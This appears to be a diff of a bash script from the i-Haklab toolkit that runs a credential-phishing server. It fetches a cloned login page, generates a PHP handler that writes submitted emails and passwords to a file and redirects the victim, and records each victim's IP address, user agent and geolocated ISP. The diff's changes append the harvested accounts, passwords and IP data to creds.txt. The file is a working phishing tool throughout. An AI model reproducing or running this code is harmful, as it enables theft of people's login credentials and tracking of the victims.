@@ -10,15 +10,8 @@ fi
 source $iHAKLAB/.set/libexec/colors
 source $iHAKLAB/.set/var/variables
 source $iHAKLAB/.set/functions/functions
-SITE=$1
-REDIRECT=$2
-if [ $1 ]; then
-	echo $SITE
-fi
-if [ $2 ]; then
-	echo $REDIRECT
-fi
-TMP_PATH=$PREFIX/var/service/php/$SITE
+
+TMP_PATH=$PREFIX/var/service/php/$2
 if [ ! -d $TMP_PATH ]; then
         mkdir -p $TMP_PATH
 fi
@@ -32,8 +25,8 @@ Doindex() {
 }
 
 Clone() {
-        printf "$G\n[+]->$W Site $SITE cloned"
-wget https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/phishing/$SITE -O $TMP_PATH/login.html > /dev/null 2>&1
+        printf "$G\n[+]->$W Site $2 cloned"
+wget https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/phishing/$2 -O $TMP_PATH/login.html > /dev/null 2>&1
 }
 
 Doip-php() {
@@ -70,7 +63,7 @@ Doip-php() {
 
 Doredirect() {
         echo "<?php" > $TMP_PATH/post.php
-        echo "header('Location: https://$REDIRECT');" >> $TMP_PATH/post.php
+        echo "header('Location: https://$3');" >> $TMP_PATH/post.php
         echo "if (!empty(\$_POST['email'])) {file_put_contents(\"usernames.txt\", \"Account: \" . \$_POST['email'] . \" Pass: \" . \$_POST['pass'] . \"\n\", FILE_APPEND);" >> $TMP_PATH/post.php
         echo "}" >> $TMP_PATH/post.php
         echo "" >> $TMP_PATH/post.php
@@ -92,11 +85,13 @@ IPs() {
         IP=$(grep -a 'IP:' $TMP_PATH/ip.txt | cut -d " " -f2 | tr -d '\r' | head -n1)
         IPTRACKER=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$IP" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > $TMP_PATH/iptracker.log)
         if [ ! -z $IP ]; then
+                echo $IP >> $TMP_PATH/creds.txt
                 printf "$G[+]-> IP:$W\t$IP"
                 sleep 0.5
         fi
         UA=$(grep 'User-Agent:' $TMP_PATH/ip.txt | cut -d '"' -f2 | head -n1 | awk '{print $1 $2 $3 $4 $5 $6}')
         if [ ! -z $UA ]; then
+                echo $UA >> $TMP_PATH/creds.txt
                 printf "$G[+]-> USER AGENT:$W\t$UA"
                 sleep 0.5
         fi
@@ -154,11 +149,13 @@ ISP=$(grep -o "ISP:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2
 Creds() {
         ACCOUNT=$(grep -o 'Account:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
         if [ ! -z $ACCOUNT ]; then
+                echo $ACCOUNT >> $TMP_PATH/creds.txt
                 printf "$G[+]-> ACCOUNT:$W\t$ACCOUNT"
                 sleep 0.5
         fi
         PASSWD=$(grep -o 'Pass:.*' $TMP_PATH/usernames.txt | cut -d ":" -f2)
         if [ ! -z $PASSWD ]; then
+                echo $PASSWD >> $TMP_PATH/creds.txt
                 printf "$G[+]-> PASSWORD:$W\t$PASSWD"
                 sleep 0.5
         fi
@@ -175,18 +172,16 @@ if [ ! -e $TMP_PATH/creds.txt ]; then
         touch $TMP_PATH/creds.txt
 fi
 
-printf "$G\n[+]->$W Credentials will be save in \$PREFIX/var/service/php/$SITE/creds.txt$Y\n[!]->$W Server php running on http://127.0.0.1:4546$Y\n[!]->$W To lunch it out of lan run :$G i-Haklab forwarding$B\n[-]->$W Waiting for information . . .\n"
+printf "$G\n[+]->$W Credentials will be save in \$PREFIX/var/service/php/creds.txt$Y\n[!]->$W Server php running on http://127.0.0.1:4546$Y\n[!]->$W Run i-Haklab forwarding to lunch it out of lan$B\n[-]->$W Waiting for information . . .\n"
 while [ true ]; do
 
         if [ -e $TMP_PATH/ip.txt ]; then
                 exec date >> $TMP_PATH/creds.txt
-		cat $TMP_PATH/ip.txt >> $TMP_PATH/creds.txt
                 IPs
         fi
 
         if [ -e $TMP_PATH/usernames.txt ]; then
                 exec date >> $TMP_PATH/creds.txt
-		cat $TMP_PATH/usernames.txt >> $TMP_PATH/creds.txt
                 Creds
         fi
         for FILE in ip.txt usernames.txt iptracker.log ; do
